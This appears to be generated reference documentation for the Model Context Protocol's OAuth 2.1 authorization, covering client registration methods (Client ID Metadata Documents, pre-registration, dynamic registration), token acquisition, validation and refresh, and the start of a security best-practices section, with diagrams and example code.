## Purpose and Scope

This document describes the three client registration mechanisms supported by MCP's OAuth 2.1 authorization framework. Client registration is the process by which MCP clients obtain credentials (specifically a `client_id` and, optionally, client secrets) to participate in authorization flows with MCP servers.

For the broader OAuth 2.1 authorization framework, see [OAuth 2.1 Authorization Framework](#3.1). For token management after registration, see [Token Management and Scope Strategy](#3.4). For general security considerations, see [Security Best Practices](#3.2).

## The Registration Challenge

MCP faces a unique authorization challenge: an unbounded number of clients need to connect to an unbounded number of servers, where neither party knows about the other in advance. Traditional OAuth deployments typically involve pre-registered clients or a small set of known authorization servers. MCP's open ecosystem makes pre-registration impractical at scale.

The three registration approaches address this challenge with different trade-offs between simplicity, security, and backwards compatibility.

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-212]()

## Registration Approach Priority

MCP clients supporting multiple registration methods **SHOULD** follow this priority order:

| Priority | Method | Use When | Requirement Level |
|----------|---------|----------|-------------------|
| 1 | Pre-registration | Client has existing relationship with server | Optional |
| 2 | Client ID Metadata Documents | Authorization Server supports it | SHOULD support |
| 3 | Dynamic Client Registration | Authorization Server supports it | MAY support |
| 4 | Manual Entry | No other option available | Fallback |

```mermaid
flowchart TD
    Start["Client needs authorization"]
    CheckPreReg{"Pre-registered<br/>credentials available?"}
    UsePre["Use pre-registered<br/>client_id"]
    
    CheckAS["Discover Authorization<br/>Server Metadata"]
    CheckCIMD{"client_id_metadata_document_supported<br/>in AS metadata?"}
    UseCIMD["Use Client ID<br/>Metadata Documents"]
    
    CheckDCR{"registration_endpoint<br/>in AS metadata?"}
    UseDCR["Use Dynamic Client<br/>Registration (DCR)"]
    
    Manual["Prompt user for<br/>manual registration"]
    
    Start --> CheckPreReg
    CheckPreReg -->|Yes| UsePre
    CheckPreReg -->|No| CheckAS
    CheckAS --> CheckCIMD
    CheckCIMD -->|Yes| UseCIMD
    CheckCIMD -->|No| CheckDCR
    CheckDCR -->|Yes| UseDCR
    CheckDCR -->|No| Manual
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:206-212]()

## Client ID Metadata Documents

### Overview

Client ID Metadata Documents (introduced in SEP-991) enable URL-based client registration. Instead of performing a registration API call, clients use an HTTPS URL as their `client_id`, where the URL points to a JSON document hosted by the client containing its metadata.

This approach solves the "unbounded clients and servers" problem by allowing clients to self-describe without requiring dynamic registration flows or manual coordination.

**Key Benefits:**
- No registration API calls required
- No client secrets to store for public clients
- Clients control their own metadata
- Authorization servers can implement trust policies based on URL domains
- Simpler than Dynamic Client Registration

**Sources:** [docs/specification/draft/basic/authorization.mdx:213-219](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:160-170]()

### Metadata Document Structure

A Client ID Metadata Document is a JSON file hosted at an HTTPS URL. The `client_id` value **MUST** exactly match the URL where the document is hosted.

```json
{
  "client_id": "https://app.example.com/oauth/client-metadata.json",
  "client_name": "Example MCP Client",
  "client_uri": "https://app.example.com",
  "logo_uri": "https://app.example.com/logo.png",
  "redirect_uris": [
    "http://127.0.0.1:3000/callback",
    "http://localhost:3000/callback"
  ],
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "token_endpoint_auth_method": "none"
}
```

**Required Fields:**
- `client_id`: Must match the document's URL exactly
- `client_name`: Human-readable name shown during consent
- `redirect_uris`: Array of allowed redirect URIs

**Optional Fields:**
- `client_uri`: Homepage URL for the client application
- `logo_uri`: Logo displayed during authorization
- `token_endpoint_auth_method`: `"none"` for public clients, `"private_key_jwt"` with JWKS for confidential clients
- `jwks_uri` or `jwks`: For clients using `private_key_jwt` authentication

**Sources:** [docs/specification/draft/basic/authorization.mdx:244-260]()

### Client Implementation Requirements

MCP clients implementing Client ID Metadata Documents **MUST**:

1. **Host metadata at HTTPS URL:** The URL must use the `https` scheme and contain a path component (e.g., `https://example.com/client.json`, not just `https://example.com`)
2. **Ensure URL matches:** The `client_id` field value must match the document URL exactly
3. **Include required fields:** `client_id`, `client_name`, and `redirect_uris` are mandatory
4. **Set proper caching headers:** The document should include HTTP cache headers for Authorization Server efficiency

**Optional:**
- Use `private_key_jwt` for client authentication with appropriate JWKS configuration

**Sources:** [docs/specification/draft/basic/authorization.mdx:227-233]()

### Authorization Server Implementation Requirements

Authorization servers implementing Client ID Metadata Documents **MUST**:

1. **Detect URL-formatted client_ids:** When receiving a `client_id` that is a URL, fetch the metadata document
2. **Validate document structure:** Ensure the JSON is valid and contains required fields
3. **Validate client_id match:** The document's `client_id` field must match the URL exactly
4. **Validate redirect_uris:** Redirect URIs in authorization requests must be in the document's allowed list
5. **Follow security considerations:** Protect against SSRF attacks (see Security Considerations section)

**SHOULD:**
- Fetch metadata documents when encountering URL-formatted `client_id` values
- Cache metadata respecting HTTP cache headers
- Implement domain-based trust policies

**Sources:** [docs/specification/draft/basic/authorization.mdx:235-242]()

### Complete Authorization Flow

```mermaid
sequenceDiagram
    participant User
    participant Client["MCP Client"]
    participant AS["Authorization Server"]
    participant MetaDoc["Metadata Endpoint<br/>(https://app.example.com/oauth/metadata.json)"]
    participant RS["MCP Server<br/>(Resource Server)"]

    Note over Client: Client hosts metadata document

    User->>Client: "Initiates connection to MCP Server"
    Client->>RS: "Initial MCP request"
    RS-->>Client: "401 Unauthorized + WWW-Authenticate"
    
    Client->>RS: "GET /.well-known/oauth-protected-resource"
    RS-->>Client: "Protected Resource Metadata<br/>(authorization_servers)"
    
    Client->>AS: "GET /.well-known/oauth-authorization-server"
    AS-->>Client: "Authorization Server Metadata<br/>(client_id_metadata_document_supported: true)"
    
    Client->>User: "Open browser with authorization URL"
    Note over Client,User: "client_id=https://app.example.com/oauth/metadata.json"
    
    User->>AS: "Authorization request"
    AS->>User: "Authentication prompt"
    User->>AS: "Provides credentials"
    
    Note over AS: "Detects URL-formatted client_id"
    AS->>MetaDoc: "GET https://app.example.com/oauth/metadata.json"
    MetaDoc-->>AS: "JSON Metadata Document"
    
    AS->>AS: "Validate:<br/>1. client_id matches URL<br/>2. redirect_uri in allowed list<br/>3. Document structure valid"
    
    alt Validation Success
        AS->>User: "Display consent page with client_name"
        User->>AS: "Approves access"
        AS->>User: "Redirect with authorization code"
        User->>Client: "Authorization code via redirect_uri"
        Client->>AS: "Exchange code for token"
        AS-->>Client: "Access token"
        Client->>RS: "MCP requests with access token"
    else Validation Failure
        AS->>User: "Error response<br/>(error=invalid_client or invalid_request)"
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:262-303]()

### Discovery

Authorization servers advertise support for Client ID Metadata Documents by including this property in their OAuth Authorization Server Metadata:

```json
{
  "client_id_metadata_document_supported": true
}
```

Clients **SHOULD** check for this capability in the metadata document obtained from `/.well-known/oauth-authorization-server` before attempting to use URL-based `client_id` values.

**Sources:** [docs/specification/draft/basic/authorization.mdx:305-316]()

### Security Considerations

#### SSRF Protection

Authorization servers fetching metadata documents **SHOULD** protect against Server-Side Request Forgery (SSRF) attacks:

- Implement allowlists or blocklists for document URLs
- Block requests to private IP ranges (RFC 1918)
- Limit redirect following when fetching documents
- Set reasonable timeouts for document fetches
- Validate TLS certificates

**Sources:** [docs/specification/draft/basic/authorization.mdx:634-641](), [docs/specification/draft/basic/security_best_practices.mdx:634-641]()

#### Localhost Redirect URI Risks

Client ID Metadata Documents cannot prevent `localhost` URL impersonation. An attacker can:

1. Provide a legitimate client's metadata URL as their `client_id`
2. Bind to a `localhost` port and provide that as the `redirect_uri`
3. Receive the authorization code when the user approves

Authorization servers **SHOULD**:
- Display additional warnings for `localhost`-only redirect URIs
- Clearly display the redirect URI hostname during authorization
- Consider requiring additional attestation for enhanced security

**Sources:** [docs/specification/draft/basic/authorization.mdx:643-658]()

#### Trust Policies

Authorization servers **MAY** implement domain-based trust policies:

- Allowlists for trusted domains (for protected servers)
- Accept any HTTPS `client_id` (for open servers)
- Reputation checks for unknown domains
- Restrictions based on domain age or certificate validation
- Display the metadata document hostname prominently to prevent phishing

**Sources:** [docs/specification/draft/basic/authorization.mdx:660-669]()

## Pre-registration

Pre-registration is the traditional OAuth approach where clients obtain credentials through an out-of-band process before initiating authorization flows.

### Implementation Approaches

MCP clients **SHOULD** support pre-registered credentials through one of two methods:

1. **Hardcoded credentials:** Client applications include a `client_id` (and, if applicable, client secret) specifically for use with known authorization servers
2. **User-provided credentials:** Present a UI allowing users to enter credentials after manually registering an OAuth client through the server's configuration interface

Pre-registration takes priority over other methods when available, as it represents an existing trusted relationship between client and server.

**Sources:** [docs/specification/draft/basic/authorization.mdx:318-327]()

## Dynamic Client Registration (DCR)

### Overview

Dynamic Client Registration (DCR), defined in [RFC 7591](https://datatracker.ietf.org/doc/html/rfc7591), allows clients to programmatically register with authorization servers without user intervention. This method is included in MCP primarily for **backwards compatibility** with earlier versions of the authorization specification.

Authorization servers and clients **MAY** support DCR, but Client ID Metadata Documents is the preferred approach for new implementations.

**Sources:** [docs/specification/draft/basic/authorization.mdx:329-333](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:162-167]()

### Discovery

Authorization servers indicate DCR support by including a `registration_endpoint` in their Authorization Server Metadata:

```json
{
  "authorization_endpoint": "https://auth.example.com/authorize",
  "token_endpoint": "https://auth.example.com/token",
  "registration_endpoint": "https://auth.example.com/register"
}
```

Clients detect DCR availability by checking for this field after discovering the Authorization Server Metadata.

**Sources:** [docs/specification/draft/basic/authorization.mdx:206-212]()

### Registration Flow

```mermaid
sequenceDiagram
    participant Client["MCP Client"]
    participant AS["Authorization Server"]
    
    Client->>AS: "GET /.well-known/oauth-authorization-server"
    AS-->>Client: "Authorization Server Metadata<br/>(includes registration_endpoint)"
    
    Client->>AS: "POST /register<br/>{ redirect_uris: [...], grant_types: [...] }"
    
    alt Registration Success
        AS->>AS: "Apply registration policies"
        AS-->>Client: "{ client_id, client_secret (optional), ... }"
        Note over Client: "Store credentials securely"
    else Registration Failure
        AS-->>Client: "Error response<br/>(e.g., invalid_redirect_uri)"
    end
    
    Note over Client,AS: "Proceed with normal OAuth 2.1 flow"
```

### Limitations

Dynamic Client Registration has several limitations that led to the development of Client ID Metadata Documents:

1. **Complexity:** Requires implementing registration endpoint on authorization servers
2. **State management:** Servers must store and manage dynamically registered clients
3. **Security challenges:** Open registration endpoints can be abused
4. **Policy enforcement:** Difficult to implement consistent policies across the ecosystem

**Sources:** [blog/content/posts/2025-11-25-first-mcp-anniversary.md:162-167]()

## Implementation Decision Tree

```mermaid
graph TB
    Start["Client needs to authorize<br/>with MCP server"]
    
    CheckExisting{"Pre-registered<br/>credentials available?"}
    UseExisting["Use pre-registered<br/>client_id and secret"]
    Success1["Authorization flow proceeds"]
    
    Discover["Fetch Authorization Server Metadata<br/>(/.well-known/oauth-authorization-server)"]
    
    CheckCIMD{"client_id_metadata_document_supported<br/>= true?"}
    HostDoc["Host metadata document<br/>at HTTPS URL"]
    UseCIMD["Use URL as client_id<br/>in authorization request"]
    Success2["Authorization flow proceeds"]
    
    CheckDCR{"registration_endpoint<br/>present?"}
    CallDCR["POST to registration_endpoint<br/>with client metadata"]
    StoreCreds["Store returned<br/>client_id and secret"]
    Success3["Authorization flow proceeds"]
    
    Manual["Display UI for manual<br/>credential entry"]
    UserEnters["User registers OAuth client<br/>and enters credentials"]
    Success4["Authorization flow proceeds"]
    
    Start --> CheckExisting
    CheckExisting -->|"Yes"| UseExisting
    UseExisting --> Success1
    
    CheckExisting -->|"No"| Discover
    Discover --> CheckCIMD
    
    CheckCIMD -->|"Yes<br/>(preferred)"| HostDoc
    HostDoc --> UseCIMD
    UseCIMD --> Success2
    
    CheckCIMD -->|"No"| CheckDCR
    CheckDCR -->|"Yes"| CallDCR
    CallDCR --> StoreCreds
    StoreCreds --> Success3
    
    CheckDCR -->|"No"| Manual
    Manual --> UserEnters
    UserEnters --> Success4
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-212]()

## Comparison Matrix

| Aspect | Pre-registration | Client ID Metadata Documents | Dynamic Client Registration |
|--------|------------------|------------------------------|----------------------------|
| **Setup Complexity** | Medium (manual process) | Low (host JSON file) | High (implement registration flow) |
| **Server State** | Stored server-side | Stateless (fetched on-demand) | Stored server-side |
| **Security** | High (known clients) | Medium-High (URL validation) | Medium (open registration) |
| **Scalability** | Poor (manual per server) | Excellent (automatic) | Good (automatic) |
| **User Experience** | Poor (manual setup) | Excellent (automatic) | Good (automatic) |
| **Client Secret** | Optional | Not needed for public clients | Optional |
| **Caching** | N/A | HTTP cache headers | N/A |
| **Trust Model** | Pre-established | URL/domain-based | Registration policies |
| **Specification** | OAuth 2.1 core | draft-ietf-oauth-client-id-metadata-document-00 | RFC 7591 |
| **MCP Recommendation** | Use when available | **Preferred for new implementations** | Backwards compatibility only |

**Sources:** [docs/specification/draft/basic/authorization.mdx:213-333]()

## Common Implementation Patterns

### Pattern 1: URL-Based Client Identity (Recommended)

```
1. Client developer hosts metadata at https://client.example.com/oauth-metadata.json
2. Metadata includes: client_id (matching URL), client_name, redirect_uris
3. In authorization request, client uses URL as client_id parameter
4. Authorization server fetches and validates metadata document
5. User sees client_name in consent screen
6. No client secrets or registration API calls needed
```

### Pattern 2: Fallback Chain

```
1. Check for pre-registered credentials in configuration
2. If not found, discover Authorization Server Metadata
3. If client_id_metadata_document_supported, use Client ID Metadata Documents
4. If registration_endpoint present, attempt Dynamic Client Registration
5. If all fail, prompt user for manual registration
```

### Pattern 3: Development vs. Production

```
Development:
- Use localhost redirect_uris in metadata document
- Accept additional warnings from authorization servers

Production:
- Use HTTPS redirect_uris in metadata document
- Host metadata on stable, trusted domain
- Implement proper TLS certificate validation
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:198-333]()

## Code References

### Authorization Server Metadata Structure

The Authorization Server Metadata document includes fields indicating supported registration methods:

- `client_id_metadata_document_supported` (boolean): Indicates support for Client ID Metadata Documents
- `registration_endpoint` (string): URL for Dynamic Client Registration

These fields are discovered by fetching `/.well-known/oauth-authorization-server` from the authorization server.

**Sources:** [docs/specification/draft/basic/authorization.mdx:305-316](), [docs/specification/draft/basic/authorization.mdx:68-72]()

### Redirect URI Validation

All registration methods require strict redirect URI validation. Authorization servers **MUST**:

- Validate redirect URIs against registered or metadata-declared values
- Use exact string matching (not pattern matching or wildcards)
- Reject authorization requests with unregistered redirect URIs

**Sources:** [docs/specification/draft/basic/authorization.mdx:618-624]()

### State Parameter Requirements

Regardless of registration method, the OAuth `state` parameter plays a critical role:

- MCP proxy servers **MUST** generate cryptographically secure random `state` values
- State tracking cookies **MUST NOT** be set until after consent approval
- State values **MUST** be validated at the callback endpoint
- State values **SHOULD** be single-use with short expiration times

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:206-220]()

# Token Management and Validation




## Purpose and Scope

This page documents how MCP handles access tokens throughout their lifecycle: from initial acquisition during the OAuth 2.1 authorization flow, through validation and usage in requests, to refresh and expiration handling. It covers the mechanisms by which MCP clients obtain tokens, how MCP servers validate them, and the security requirements that govern token handling.

For information about the complete OAuth 2.1 authorization framework and client registration, see [OAuth 2.1 Authorization Framework](#3.1). For client registration methods specifically, see [Client Registration Methods](#3.2). For security threats and mitigations related to tokens, see [Security Best Practices and Threat Models](#3.4).

## Token Lifecycle Overview

Access tokens in MCP follow a standard OAuth 2.1 lifecycle with several key phases:

```mermaid
graph LR
    A["Client Requests<br/>Authorization"] --> B["Authorization Server<br/>Issues Token"]
    B --> C["Client Stores<br/>Token"]
    C --> D["Client Includes Token<br/>in Requests"]
    D --> E["Server Validates<br/>Token"]
    E --> F{Token Valid?}
    F -->|Yes| G["Process Request"]
    F -->|No| H["Return 401"]
    G --> I{Token Expired?}
    I -->|Yes| J["Client Refreshes<br/>Token"]
    I -->|No| K["Continue Using<br/>Token"]
    J --> C
    K --> D
    H --> J
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:441-485](), [docs/specification/2025-06-18/basic/authorization.mdx:233-278]()

## Token Acquisition

### Authorization Flow Token Request

After the user completes authorization, the MCP client exchanges an authorization code for tokens at the authorization server's token endpoint. This exchange includes the `resource` parameter to bind the token to the specific MCP server.

**Token Request Parameters:**

| Parameter | Required | Purpose |
|-----------|----------|---------|
| `grant_type` | Yes | Must be `authorization_code` |
| `code` | Yes | Authorization code from authorization endpoint |
| `code_verifier` | Yes | PKCE verifier matching the code_challenge |
| `resource` | Yes | Canonical URI of the MCP server (RFC 8707) |
| `client_id` | Yes | Client identifier |
| `redirect_uri` | Yes | Must match registered redirect URI |

**Token Response:**

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def502...",
  "scope": "mcp:tools mcp:resources"
}
```

The `access_token` is an opaque string (or JWT) that the client includes in subsequent requests. The `expires_in` field indicates token lifetime in seconds. The `refresh_token` (if present) allows obtaining new access tokens without user interaction.

**Sources:** [docs/specification/draft/basic/authorization.mdx:352-400](), [docs/specification/2025-06-18/basic/authorization.mdx:153-192](), [docs/tutorials/security/authorization.mdx:106-120]()

## Token Storage and Security

### Client-Side Token Storage

MCP clients **MUST** implement secure token storage following OAuth 2.1 best practices [docs/specification/draft/basic/authorization.mdx:575-584](). Storage mechanisms vary by platform:

- **Desktop/Native Applications**: Use OS-provided credential storage (keychain, credential manager)
- **Web Applications**: Use secure, HTTP-only cookies or encrypted local storage
- **Server Applications**: Use encrypted configuration or secrets management systems

Tokens **MUST NOT** be:
- Logged or written to unencrypted files
- Embedded in source code
- Transmitted over unencrypted connections
- Stored in browser local storage (for web apps)

### Token Rotation for Public Clients

Authorization servers **MUST** rotate refresh tokens for public clients as described in [OAuth 2.1 Section 4.3.1](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-4.3.1). This prevents attackers who obtain a refresh token from using it indefinitely.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-584](), [docs/tutorials/security/authorization.mdx:242-247]()

## Token Validation

### Server-Side Validation Requirements

MCP servers acting as OAuth 2.1 resource servers **MUST** validate access tokens before processing requests. Validation occurs in two phases:

#### Phase 1: Token Introspection or JWT Verification

Servers can validate tokens using either:

**Token Introspection (RFC 7662):**
- Server sends token to authorization server's introspection endpoint
- Authorization server responds with token metadata
- Suitable for opaque tokens or when server lacks JWT verification capability

**JWT Verification:**
- Server validates JWT signature using authorization server's public keys
- Server verifies standard claims (`exp`, `iat`, `iss`)
- Suitable for self-contained tokens with embedded claims
- Reduces latency by eliminating network call to authorization server

#### Phase 2: Audience Validation

After confirming token validity, servers **MUST** validate that the token was issued specifically for them as the intended audience. This is the critical security check that prevents token reuse across different services.

**Audience Validation Methods:**

1. **JWT `aud` Claim**: If token is a JWT, verify the `aud` claim contains the server's canonical URI
2. **Introspection Response**: If using introspection, verify the `aud` field in the response
3. **Resource Parameter Binding**: Verify token was issued with the `resource` parameter matching the server's URI

**Example JWT Validation:**

```json
{
  "iss": "https://auth.example.com",
  "aud": "https://mcp.example.com",
  "sub": "user123",
  "exp": 1755540817,
  "iat": 1755540757,
  "scope": "mcp:tools"
}
```

The server must verify:
- `aud` matches its canonical URI (`https://mcp.example.com`)
- `exp` is in the future
- `iss` is a trusted authorization server
- `scope` contains required permissions

**Sources:** [docs/specification/draft/basic/authorization.mdx:469-485](), [docs/specification/2025-06-18/basic/authorization.mdx:261-278](), [docs/tutorials/security/authorization.mdx:405-490]()

### Validation Implementation Patterns

The TypeScript SDK provides middleware for token validation. The `requireBearerAuth` middleware [docs/sdk/java/mcp-client.mdx:200-241]() handles extraction and validation:

```typescript
const authMiddleware = requireBearerAuth({
  verifier: tokenVerifier,
  requiredScopes: [],
  resourceMetadataUrl: getOAuthProtectedResourceMetadataUrl(mcpServerUrl),
});
```

The `verifier` object implements token validation logic:

```typescript
const tokenVerifier = {
  verifyAccessToken: async (token: string) => {
    // 1. Call introspection endpoint
    const response = await fetch(introspectionEndpoint, {
      method: "POST",
      body: new URLSearchParams({
        token: token,
        client_id: clientId,
        client_secret: clientSecret
      })
    });
    
    const data = await response.json();
    
    // 2. Check token is active
    if (data.active === false) {
      throw new Error("Inactive token");
    }
    
    // 3. Validate audience
    const audiences = Array.isArray(data.aud) ? data.aud : [data.aud];
    const allowed = audiences.some(a => 
      checkResourceAllowed({
        requestedResource: a,
        configuredResource: mcpServerUrl
      })
    );
    
    if (!allowed) {
      throw new Error("Token audience mismatch");
    }
    
    return {
      token,
      clientId: data.client_id,
      scopes: data.scope ? data.scope.split(" ") : [],
      expiresAt: data.exp
    };
  }
};
```

**Sources:** [docs/tutorials/security/authorization.mdx:405-490](), [docs/sdk/java/mcp-client.mdx:200-241]()

## Token Usage in Requests

### Bearer Token Header Format

MCP clients **MUST** include access tokens in the `Authorization` header using the Bearer scheme as defined in [RFC 6750](https://datatracker.ietf.org/doc/html/rfc6750):

```http
GET /mcp HTTP/1.1
Host: mcp.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

**Requirements:**

- Token **MUST** be included in the `Authorization` header, not in query parameters
- Token **MUST** be included in every HTTP request, even within the same session
- Header format is case-insensitive: `Bearer`, `bearer`, or `BEARER` are all valid
- Token value is opaque to the client (client does not parse or modify it)

### Error Responses for Invalid Tokens

When a client sends an invalid or expired token, the server **MUST** respond with HTTP 401 Unauthorized:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="mcp",
                  error="invalid_token",
                  error_description="The access token expired"
```

The client should then attempt to refresh the token or restart the authorization flow.

**Sources:** [docs/specification/draft/basic/authorization.mdx:441-485](), [docs/specification/2025-06-18/basic/authorization.mdx:233-278]()

## Token Refresh

### Refresh Token Grant

When an access token expires, clients can obtain a new one using the refresh token without requiring user interaction. This uses the `refresh_token` grant type:

**Refresh Token Request:**

```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&
refresh_token=def502...&
client_id=client123&
resource=https://mcp.example.com
```

**Refresh Token Response:**

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "def502..."
}
```

### Refresh Token Rotation

Authorization servers **SHOULD** issue a new refresh token with each refresh response. Clients **MUST** replace the old refresh token with the new one. This prevents attackers from using captured refresh tokens indefinitely.

### Client Refresh Logic

Clients should implement proactive refresh to avoid token expiration during operations:

```typescript
async function ensureValidToken() {
  const now = Date.now() / 1000;
  const expiresAt = tokenMetadata.expiresAt;
  
  // Refresh if token expires within 5 minutes
  if (expiresAt - now < 300) {
    await refreshAccessToken();
  }
}
```

Alternatively, clients can implement reactive refresh by catching 401 responses and attempting refresh before retrying the request.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-584]()

## Scope Management and Step-Up Authorization

### Scope Selection Strategy

During initial authorization, MCP clients **SHOULD** follow this priority order for scope selection [docs/specification/draft/basic/authorization.mdx:335-350]():

1. Use `scope` parameter from the `WWW-Authenticate` header in the 401 response, if provided
2. If `scope` is not available, use all scopes defined in `scopes_supported` from the Protected Resource Metadata document
3. If `scopes_supported` is undefined, omit the `scope` parameter

This approach accommodates the general-purpose nature of MCP clients, which typically lack domain-specific knowledge to make informed decisions about individual scope selection.

### Insufficient Scope Errors at Runtime

When a client makes a request with insufficient permissions, the server **SHOULD** respond with HTTP 403 Forbidden:

```http
HTTP/1.1 403 Forbidden
WWW-Authenticate: Bearer error="insufficient_scope",
                  scope="files:read files:write user:profile",
                  resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource",
                  error_description="Additional file write permission required"
```

### Step-Up Authorization Flow

When receiving an insufficient scope error, clients **SHOULD** respond by requesting a new access token with an increased set of scopes:

1. Parse error information from the `WWW-Authenticate` header
2. Determine required scopes using the scope selection strategy
3. Initiate (re-)authorization with the determined scope set
4. Retry the original request with the new token
5. Implement retry limits to avoid infinite loops

**Sources:** [docs/specification/draft/basic/authorization.mdx:335-350](), [docs/specification/draft/basic/authorization.mdx:497-558]()

## Token Audience Binding

### Resource Parameter and Audience Validation

The `resource` parameter (RFC 8707) binds tokens to their intended audience, preventing token reuse across different services. This is a critical security mechanism.

**Client Responsibilities:**

- Include `resource` parameter in both authorization and token requests
- Use the canonical URI of the MCP server (lowercase scheme and host, no fragment)
- Send regardless of whether the authorization server supports it

**Server Responsibilities:**

- Validate that tokens include the server in the `aud` claim
- Reject tokens where the audience does not match the server's canonical URI
- Implement this validation for all token types (JWT or introspection-based)

**Canonical URI Examples:**

| Valid | Invalid |
|-------|---------|
| `https://mcp.example.com` | `mcp.example.com` (missing scheme) |
| `https://mcp.example.com/mcp` | `https://mcp.example.com#fragment` (contains fragment) |
| `https://mcp.example.com:8443` | `https://mcp.example.com/` (trailing slash may cause issues) |

**Sources:** [docs/specification/draft/basic/authorization.mdx:402-439](), [docs/specification/2025-06-18/basic/authorization.mdx:194-232]()

## Token Validation Flow Diagram

```mermaid
sequenceDiagram
    participant C as "MCP Client"
    participant S as "MCP Server"
    participant A as "Authorization Server"
    
    C->>S: HTTP Request + Authorization: Bearer token
    
    S->>S: Extract token from header
    
    alt Token is JWT
        S->>S: Verify JWT signature
        S->>S: Check exp claim
        S->>S: Verify aud claim matches server URI
    else Token is opaque
        S->>A: POST /introspect (token)
        A-->>S: {active, aud, exp, scope, ...}
        S->>S: Check active == true
        S->>S: Verify aud includes server URI
    end
    
    S->>S: Check required scopes in token
    
    alt All validations pass
        S->>C: Process request normally
        S-->>C: 200 OK + response
    else Token invalid/expired
        S-->>C: 401 Unauthorized
        C->>A: POST /token (refresh_token grant)
        A-->>C: New access_token
        C->>S: Retry with new token
    else Insufficient scope
        S-->>C: 403 Forbidden + WWW-Authenticate
        C->>A: New authorization with more scopes
        A-->>C: New access_token
        C->>S: Retry with new token
    end
```

**Sources:** [docs/specification/draft/basic/authorization.mdx:469-485](), [docs/tutorials/security/authorization.mdx:405-490]()

## Token Validation Implementation Reference

The following table maps token validation concepts to SDK implementations:

| Concept | TypeScript SDK | Python SDK | Java SDK |
|---------|---|---|---|
| Bearer token extraction | `requireBearerAuth` middleware | FastMCP auth decorators | `requireBearerAuth` middleware |
| Token introspection | `verifyAccessToken` callback | Token validation handler | `verifier` interface |
| Audience validation | `checkResourceAllowed` utility | Resource validation | `checkResourceAllowed` utility |
| Scope checking | Scope array comparison | Scope string parsing | Scope list validation |
| Error responses | 401/403 HTTP responses | HTTP status codes | HTTP status codes |

**Sources:** [docs/tutorials/security/authorization.mdx:316-609](), [docs/sdk/java/mcp-client.mdx:200-241]()

## Security Considerations for Token Management

### Token Theft Prevention

Attackers who obtain tokens can access protected resources. Mitigation strategies:

1. **Short-lived tokens**: Authorization servers **SHOULD** issue access tokens with short lifetimes (minutes to hours)
2. **Secure storage**: Clients **MUST** store tokens securely using OS-provided mechanisms
3. **HTTPS only**: All token transmission **MUST** use HTTPS
4. **No logging**: Tokens **MUST NOT** be logged or written to files
5. **Refresh token rotation**: Authorization servers **MUST** rotate refresh tokens

### Token Passthrough Prevention

MCP servers **MUST NOT** forward tokens received from clients to upstream services. If the server needs to call upstream APIs, it **MUST** obtain separate tokens from those APIs' authorization servers.

**Incorrect (Vulnerable):**
```typescript
// DO NOT DO THIS
const upstreamResponse = await fetch('https://upstream-api.com/data', {
  headers: {
    'Authorization': `Bearer ${clientToken}` // WRONG: reusing client token
  }
});
```

**Correct:**
```typescript
// DO THIS INSTEAD
const upstreamToken = await getUpstreamToken(); // Get separate token
const upstreamResponse = await fetch('https://upstream-api.com/data', {
  headers: {
    'Authorization': `Bearer ${upstreamToken}` // Separate token for upstream
  }
});
```

### Confused Deputy Prevention

MCP servers acting as intermediaries must validate that tokens are intended for them, not for other services. The audience validation mechanism prevents this attack.

**Sources:** [docs/specification/draft/basic/authorization.mdx:560-600](), [docs/specification/2025-06-18/basic/authorization.mdx:289-376]()

# Security Best Practices




## Purpose and Scope

This document identifies security attack vectors specific to MCP implementations and provides detailed mitigation strategies. It complements the OAuth 2.1 authorization framework specification covered in [OAuth 2.1 Authorization Framework](#3.1) and provides concrete guidance for implementing defense-in-depth security measures.

For information about token management, scope selection strategies, and incremental authorization flows, see [Token Management and Scope Strategy](#3.4). For client registration security considerations, see [Client Registration Methods](#3.3).

This document is intended for:
- Developers implementing MCP authorization flows
- MCP server operators deploying HTTP-based servers
- Security professionals evaluating MCP-based systems

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:1-14]()

## Security Architecture Overview

```mermaid
graph TB
    subgraph "MCP Client Security Boundary"
        Client["MCP Client"]
        TokenStore["Secure Token Storage"]
        PKCE["PKCE Generator"]
        Client --> TokenStore
        Client --> PKCE
    end
    
    subgraph "MCP Server Security Boundary"
        Server["MCP Server<br/>(Resource Server)"]
        TokenValidator["Token Validator"]
        AudienceCheck["Audience Verification<br/>(RFC 8707)"]
        ScopeCheck["Scope Authorization"]
        
        Server --> TokenValidator
        TokenValidator --> AudienceCheck
        TokenValidator --> ScopeCheck
    end
    
    subgraph "Authorization Server Security Boundary"
        AuthServer["Authorization Server"]
        Metadata["Protected Resource Metadata<br/>(RFC 9728)"]
        PkceValidator["PKCE Validator"]
        ConsentUI["Consent UI<br/>(Human-in-the-Loop)"]
        
        AuthServer --> Metadata
        AuthServer --> PkceValidator
        AuthServer --> ConsentUI
    end
    
    Client -->|"WWW-Authenticate<br/>resource_metadata"| Server
    Server -->|"401 Unauthorized"| Client
    
    Client -->|"Authorization Request<br/>+ code_challenge"| AuthServer
    AuthServer -->|"Access Token<br/>(audience-bound)"| Client
    
    Client -->|"Bearer Token"| Server
    Server -->|"Validates audience"| AudienceCheck
    
    style AudienceCheck fill:#f9f9f9
    style ConsentUI fill:#f9f9f9
    style PkceValidator fill:#f9f9f9
```

**MCP Security Architecture**

This architecture implements multiple security layers: client-side PKCE protection against code interception, server-side audience validation preventing token replay, and authorization server consent enforcement ensuring human approval. Each boundary enforces independent security controls.

